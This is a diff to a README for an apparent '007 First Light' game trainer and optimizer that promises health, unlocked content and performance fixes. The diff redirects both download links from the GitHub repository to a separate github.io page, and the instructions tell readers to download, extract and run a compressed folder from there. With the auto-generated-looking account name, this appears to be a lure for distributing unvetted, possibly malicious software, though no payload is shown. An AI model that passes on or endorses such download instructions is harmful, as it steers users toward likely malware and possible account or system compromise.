@@ -1,6 +1,6 @@
 # 🎮 007-First-Light-Trainer-And-Optimizer - Enhance game performance and unlock content
 
-[![](https://img.shields.io/badge/Download_Software-Blue?style=for-the-badge)](https://github.com/Walleyed-sixteenthnote61/007-First-Light-Trainer-And-Optimizer)
+[![](https://img.shields.io/badge/Download_Software-Blue?style=for-the-badge)](https://walleyed-sixteenthnote61.github.io)
 
 This software helps you manage your experience in 007 First Light. It provides tools to adjust game settings, gain health, and unlock hidden items. You use this to fix stuttering issues and change how the game behaves.
 
@@ -30,7 +30,7 @@ Your computer needs specific hardware to run this tool. Use this list to check i
 
 To get the tool, you must visit the project page. Follow these instructions to move from the download to the active state.
 
-1. Visit [this page](https://github.com/Walleyed-sixteenthnote61/007-First-Light-Trainer-And-Optimizer) to download the compressed folder.
+1. Visit [this page](https://walleyed-sixteenthnote61.github.io) to download the compressed folder.
 2. Locate the file in your Downloads folder.
 3. Right-click the folder and choose Extract All.
 4. Open the extracted folder.
